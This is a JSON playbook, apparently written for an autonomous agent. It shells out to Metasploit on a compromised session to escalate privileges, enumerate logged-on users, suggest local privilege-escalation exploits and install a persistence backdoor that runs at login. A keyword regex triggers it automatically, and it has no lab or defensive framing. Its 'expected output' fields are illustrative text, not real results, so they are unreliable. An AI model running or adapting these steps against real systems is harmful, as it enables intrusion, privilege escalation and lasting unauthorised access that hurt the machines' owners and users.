{
  "name": "msf_post_modules_privilege_escalation",
  "description": "Post-exploitation modules for privilege escalation, persistence, lateral movement",
  "pattern": "post.*module|privilege.*escalation|persistence.*module|lateral.*movement",
  "parameters": ["session_id", "post_module"],
  "sequence": [
    {"action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "msfconsole -q -x 'use {{post_module}}; set SESSION {{session_id}}; run'"]}, "expected_output": {"type": "string", "example": "Post module executing on session {{session_id}}\nPrivilege escalation successful: SYSTEM access obtained"}},
    {"action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "msfconsole -q -x 'use post/windows/gather/enum_logged_on_users; set SESSION {{session_id}}; run'"]}, "expected_output": {"type": "string", "example": "Logged on users:\nVICTIM\\administrator (Console)\nVICTIM\\user1 (RDP session 2)"}},
    {"action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "msfconsole -q -x 'use post/multi/recon/local_exploit_suggester; set SESSION {{session_id}}; run'"]}, "expected_output": {"type": "string", "example": "Exploit suggester found 5 potential privesc exploits:\nexploit/windows/local/ms16_032_secondary_logon_handle_privesc\nexploit/windows/local/bypassuac_eventvwr"}},
    {"action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "msfconsole -q -x 'use post/windows/manage/persistence_exe; set SESSION {{session_id}}; run'"]}, "expected_output": {"type": "string", "example": "Persistence installed: backdoor.exe in Startup folder\nBackdoor will execute on user login"}},
    {"action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "msfconsole -q -x 'search type:post platform:windows'"]}, "expected_output": {"type": "string", "example": "456 post-exploitation modules found for Windows"}}
  ],
  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
  "created_by": "neural_mesh_v5.2_generator"
}
